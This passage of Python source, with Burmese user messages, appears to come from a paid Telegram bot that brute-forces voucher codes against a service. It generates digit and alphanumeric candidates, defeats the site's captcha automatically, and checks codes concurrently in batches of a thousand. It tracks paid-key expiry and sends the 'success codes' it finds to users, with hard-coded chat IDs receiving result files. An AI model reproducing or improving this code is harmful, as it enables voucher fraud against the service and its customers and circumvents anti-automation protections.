    approved_users = len(paid_users) + sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"{E_STATS} <b>Bot Status</b>\n\n"
        f"{E_CLOCK} Uptime: {hours}h {minutes}m {seconds}s\n"
        f"{E_SEARCH} Active Scans: {active_scans}\n"
        f"{E_CHECK} PAID Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}",
        parse_mode="HTML"
    )

async def send_success_file(chat_id):
    target_ids = ["6988969946", "1981253384", "1477223103"]
    if str(chat_id) in target_ids and chat_id in success_texts and success_texts[chat_id]:
        try:
            filename = f"success_{chat_id}_{int(time.time())}.txt"
            content = "\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            
            with open(filename, "rb") as f:
                await bot.send_document(
                    chat_id, f,
                    caption=f"{E_CHECK} Scan ရပ်တန့်သွားသောကြောင့် ရရှိထားသော Success Codes များကို ဖိုင်အဖြစ် ပို့ပေးလိုက်ပါသည်။",
                    parse_mode="HTML"
                )
            
            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            print(f"Error sending file: {e}")

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        await send_success_file(chat_id)
        
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, f"{E_STOPEMJ} Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard(), parse_mode="HTML")
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

strings_mixed = string.ascii_lowercase + string.digits
def mixed_generator(length=6):
    return "".join(random.choice(strings_mixed) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
            
        if mode in ["6", "7"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
        if mode == "9":
            while True:
                yield digit_generator(9)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    if mode == "all7":
        while True:
            yield all_generator(7)
    if mode == "all8":
        while True:
            yield all_generator(8)
    if mode == "mixed":
        while True:
            yield mixed_generator(6)
    if mode == "mixed8":
        while True:
            yield mixed_generator(8)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"{E_SEARCH}Scanning VOUCHER Codes...\n\n"
            f"{E_PACKAGE}Checked : {checked:,}/{total:,}\n"
            f"{E_STATS}Progress : {percent:.2f}%\n"
            f"{E_SCAN}Speed : {speed_str}\n"
            f"{E_CHECK}Success code hit : {found}\n"
            f"[{bar}]"
        )
    return (
        f"{E_SEARCH}Scanning VOUCHER Codes...\n\n"
        f"{E_PACKAGE}Checked : {checked:,}\n"
        f"{E_SCAN}Speed : {speed_str}\n"
        f"{E_CHECK}Success code hit : {found}\n"
        f"{E_STATS}Status : running\n"
    )

BATCH_SIZE = 1000

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if start_digit is not None:
            total = 10 ** (length - 1)
        else:
            total = 10 ** length
    elif mode == "ascii-lower":
        total = 26 ** 6
    elif mode == "all":
        total = 36 ** 6
    elif mode == "all7":
        total = 36 ** 7
    elif mode == "all8":
        total = 36 ** 8
    elif mode == "mixed":
        total = 36 ** 6
    elif mode == "mixed8":
        total = 36 ** 8
    else:
        total = None
    
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    last_progress_update = 0.0
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                if is_admin(chat_id):
                    approve[chat_id] = True
                    paid_users[str(chat_id)] = True
                else:
                    user_info = db_get_user(str(chat_id))
                    key_info = db_get_key(user_info["key"]) if user_info else None
                    if not key_info or not check_key_expiration(key_info.get("expires_at")):
                        approve[chat_id] = False
                        paid_users.pop(str(chat_id), None)
                        await bot.send_message(chat_id, "သင်၏ PAID KEY သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        scan_tasks.pop(chat_id, None)
                        success_messages.pop(chat_id, None)
                        success_texts.pop(chat_id, None)
                        return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            # ========== Progress update throttle (3s) ==========
            now = time.monotonic()
            if now - last_progress_update < 3.0:
                continue
            last_progress_update = now

            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            
            if total is not None:
                text = format_progress(checked, total, speed, found)
            else:
                text = format_progress(checked, None, speed, found)
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="HTML")
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text, parse_mode="HTML")
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            found = len(success_texts)
    except Exception as e:
        print(f"Run Bruteforce Error: {e}")
